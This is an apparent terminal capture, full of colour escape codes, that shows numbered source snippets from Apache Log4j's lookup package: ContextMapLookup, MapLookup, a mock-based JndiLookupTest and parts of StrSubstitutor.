[2;36m                    [0m         [1;36m55[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:    private String [0m[1;35mformatDate[0m[1;39m([0m[39mfinal long date, final String format[0m[1;39m)[0m[39m [0m[1;39m{[0m            [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:        DateFormat dateFormat = null;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        if [0m[1;39m([0m[39mformat != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:            try [0m[1;39m{[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:                dateFormat = new [0m[1;35mSimpleDateFormat[0m[1;39m([0m[39mformat[0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:            [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:                [0m[1;35mLOGGER.error[0m[1;39m([0m[32m"Invalid date format: \""[0m[39m + format + [0m[32m"\", using [0m    [2m                [0m
[2;36m                    [0m         [32mdefault"[0m[39m, ex[0m[1;39m)[0m[39m;[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        if [0m[1;39m([0m[39mdateFormat == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:            dateFormat = [0m[1;35mDateFormat.getInstance[0m[1;39m([0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:        return [0m[1;35mdateFormat.format[0m[1;39m([0m[39mnew [0m[1;35mDate[0m[1;39m([0m[39mdate[0m[1;39m)[0m[1;39m)[0m[39m;[0m                                [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/ContextMapLookup.jav[0m[1;92ma:19[0m[39m-[0m[1;36m21[0m [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import org.apache.logging.log4j.ThreadContext;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/ContextMapLookup.jav[0m[1;92ma:26[0m[39m-[0m[1;36m49[0m [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"ctx"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:public class ContextMapLookup implements StrLookup [0m[1;39m{[0m                             [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:     * Lookup the value from the ThreadContext Map.[0m                              [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:     * @return The value associated with the key.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:        return [0m[1;35mThreadContext.get[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     * Lookup the value from the ThreadContext Map.[0m                              [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:     * @param event The current LogEvent.[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:     * @return The value associated with the key.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:        return [0m[1;35mevent.getContextMap[0m[1;39m([0m[1;39m)[0m[1;35m.get[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/MapLookup.jav[0m[1;92ma:19[0m[39m-[0m[1;36m23[0m        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.util.Map;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.message.MapMessage;[0m                              [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/MapLookup.jav[0m[1;92ma:28[0m[39m-[0m[1;36m88[0m        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"map"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:public class MapLookup implements StrLookup [0m[1;39m{[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:     * Map keys are variable names and value.[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    private final Map<String, String> map;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:     * Creates a new instance backed by a Map. Used by the default lookup.[0m       [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:     *[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * @param map the map of keys to values, may be null[0m                         [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    public [0m[1;35mMapLookup[0m[1;39m([0m[39mfinal Map<String, String> map[0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:        this.map = map;[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:     * Constructor when used directly as a plugin.[0m                               [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:    public [0m[1;35mMapLookup[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:        this.map = null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:     * Looks up a String key to a String value using the map.[0m                    [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:     * <p/>[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:     * If the map is null, then null is returned.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:     * The map result object is converted to a string using [0m[1;35mtoString[0m[1;39m([0m[1;39m)[0m[39m.[0m          [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:     *[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:     * @param key the key to be looked up, may be null[0m                           [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:     * @return the matching value, null if no match[0m                              [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        if [0m[1;39m([0m[39mmap == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        final String obj = [0m[1;35mmap.get[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:        if [0m[1;39m([0m[39mobj == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:        return obj;[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:        if [0m[1;39m([0m[39mmap == null && ![0m[1;39m([0m[1;35mevent.getMessage[0m[1;39m([0m[1;39m)[0m[39m instanceof MapMessage[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m        [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:        if [0m[1;39m([0m[39mmap != null && [0m[1;35mmap.containsKey[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                               [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:            final String obj = [0m[1;35mmap.get[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:            if [0m[1;39m([0m[39mobj != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:                return obj;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:        if [0m[1;39m([0m[1;35mevent.getMessage[0m[1;39m([0m[1;39m)[0m[39m instanceof MapMessage[0m[1;39m)[0m[39m [0m[1;39m{[0m                          [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:            return [0m[1;39m([0m[1;39m([0m[39mMapMessage[0m[1;39m)[0m[39m [0m[1;35mevent.getMessage[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[1;35m.get[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:        return null;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/test/java/org/apache/logging/log4j/core/lookup/JndiLookupTest.jav[0m[1;92ma:19[0m[39m-[0m[1;36m29[0m   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import static org.junit.Assert.assertEquals;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import static org.junit.Assert.assertNull;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import javax.naming.Context;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import javax.naming.InitialContext;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import javax.naming.NamingException;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:import org.junit.After;[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:import org.junit.Before;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:import org.junit.Test;[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:import org.mockejb.jndi.MockContextFactory;[0m                                      [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/test/java/org/apache/logging/log4j/core/lookup/JndiLookupTest.jav[0m[1;92ma:34[0m[39m-[0m[1;36m67[0m   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:public class JndiLookupTest [0m[1;39m{[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    private static final String TEST_CONTEXT_RESOURCE_NAME = [0m                    [2m                [0m
[2;36m                    [0m         [32m"logging/context-name"[0m[39m;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:    private static final String TEST_CONTEXT_NAME = [0m[32m"app-1"[0m[39m;[0m                     [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:    @Before[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    public void [0m[1;35mbefore[0m[1;39m([0m[1;39m)[0m[39m throws NamingException [0m[1;39m{[0m                                [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:        [0m[1;35mMockContextFactory.setAsInitial[0m[1;39m([0m[1;39m)[0m[39m;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:        Context context = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        [0m[1;35mcontext.bind[0m[1;39m([0m[39mJndiLookup.CONTAINER_JNDI_RESOURCE_PATH_PREFIX + [0m           [2m                [0m
[2;36m                    [0m         [39mTEST_CONTEXT_RESOURCE_NAME, TEST_CONTEXT_NAME[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    @After[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:    public void [0m[1;35mafter[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:        [0m[1;35mMockContextFactory.revertSetAsInitial[0m[1;39m([0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:    @Test[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    public void [0m[1;35mtestLookup[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:        if [0m[1;39m([0m[39m! [0m[1;35mJndiLookup.isEnableJndi[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:            return;[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        final StrLookup lookup = new [0m[1;35mJndiLookup[0m[1;39m([0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        String contextName = [0m[1;35mlookup.lookup[0m[1;39m([0m[39mTEST_CONTEXT_RESOURCE_NAME[0m[1;39m)[0m[39m;[0m          [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTEST_CONTEXT_NAME, contextName[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        contextName = [0m                                                           [2m                [0m
[2;36m                    [0m         [1;35mlookup.lookup[0m[1;39m([0m[39mJndiLookup.CONTAINER_JNDI_RESOURCE_PATH_PREFIX + [0m                     [2m                [0m
[2;36m                    [0m         [39mTEST_CONTEXT_RESOURCE_NAME[0m[1;39m)[0m[39m;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTEST_CONTEXT_NAME, contextName[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:        String nonExistingResource = [0m                                            [2m                [0m
[2;36m                    [0m         [1;35mlookup.lookup[0m[1;39m([0m[32m"logging/non-existing-resource"[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        [0m[1;35massertNull[0m[1;39m([0m[39mnonExistingResource[0m[1;39m)[0m[39m;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.jav[0m[1;92ma:280[0m[39m-[0m[1;36m310[0m [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m280[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m281[0m[39m:    [0m[35m/[0m[35m/[0m[95m-----------------------------------------------------------------------[0m   [2m                [0m
[2;36m                    [0m         [1;36m282[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m283[0m[39m:     * Replaces all the occurrences of variables with their matching values[0m     [2m                [0m
[2;36m                    [0m         [1;36m284[0m[39m:     * from the resolver using the given source string as a template.[0m           [2m                [0m
[2;36m                    [0m         [1;36m285[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m286[0m[39m:     * @param source  the string to replace in, null returns null[0m               [2m                [0m
[2;36m                    [0m         [1;36m287[0m[39m:     * @return the result of the replace operation[0m                              [2m                [0m
[2;36m                    [0m         [1;36m288[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m289[0m[39m:    public String [0m[1;35mreplace[0m[1;39m([0m[39mfinal String source[0m[1;39m)[0m[39m [0m[1;39m{[0m                                [2m                [0m
[2;36m                    [0m         [1;36m290[0m[39m:        return [0m[1;35mreplace[0m[1;39m([0m[39mnull, source[0m[1;39m)[0m[39m;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m291[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m292[0m[39m:    [0m[35m/[0m[35m/[0m[95m-----------------------------------------------------------------------[0m   [2m                [0m
[2;36m                    [0m         [1;36m293[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m294[0m[39m:     * Replaces all the occurrences of variables with their matching values[0m     [2m                [0m
[2;36m                    [0m         [1;36m295[0m[39m:     * from the resolver using the given source string as a template.[0m           [2m                [0m
[2;36m                    [0m         [1;36m296[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m297[0m[39m:     * @param event The current LogEvent if there is one.[0m                       [2m                [0m
[2;36m                    [0m         [1;36m298[0m[39m:     * @param source  the string to replace in, null returns null[0m               [2m                [0m
[2;36m                    [0m         [1;36m299[0m[39m:     * @return the result of the replace operation[0m                              [2m                [0m
[2;36m                    [0m         [1;36m300[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m301[0m[39m:    public String [0m[1;35mreplace[0m[1;39m([0m[39mfinal LogEvent event, final String source[0m[1;39m)[0m[39m [0m[1;39m{[0m          [2m                [0m
[2;36m                    [0m         [1;36m302[0m[39m:        if [0m[1;39m([0m[39msource == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m303[0m[39m:            return null;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m304[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m305[0m[39m:        final StringBuilder buf = new [0m[1;35mStringBuilder[0m[1;39m([0m[39msource[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m306[0m[39m:        if [0m[1;39m([0m[39m![0m[1;35msubstitute[0m[1;39m([0m[39mevent, buf, [0m[1;36m0[0m[39m, [0m[1;35msource.length[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                      [2m                [0m
[2;36m                    [0m         [1;36m307[0m[39m:            return source;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m308[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m309[0m[39m:        return [0m[1;35mbuf.toString[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m310[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.jav[0m[1;92ma:100[0m[39m-[0m[1;36m200[0m [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m: * [0m[1;39m{[0m[39m@link #[0m[1;35msetEnableSubstitutionInVariables[0m[1;39m([0m[39mboolean[0m[1;39m)[0m[39m [0m                           [2m                [0m
[2;36m                    [0m         [39menableSubstitutionInVariables[0m[1;39m}[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m101[0m[39m: * property to <b>true<[0m[35m/[0m[95mb[0m[39m>.[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m102[0m[39m: *[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m103[0m[39m: *[0m[35m/[0m                                                                             [2m                [0m
[2;36m                    [0m         [1;36m104[0m[39m:public class StrSubstitutor [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m105[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m106[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m107[0m[39m:     * Constant for the default escape character.[0m                               [2m                [0m
[2;36m                    [0m         [1;36m108[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m109[0m[39m:    public static final char DEFAULT_ESCAPE = [0m[32m'$'[0m[39m;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m111[0m[39m:     * Constant for the default variable prefix.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m112[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m113[0m[39m:    public static final StrMatcher DEFAULT_PREFIX = [0m                            [2m                [0m
[2;36m                    [0m         [1;35mStrMatcher.stringMatcher[0m[1;39m([0m[32m"$[0m[32m{[0m[32m"[0m[1;39m)[0m[39m;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m114[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m115[0m[39m:     * Constant for the default variable suffix.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m116[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
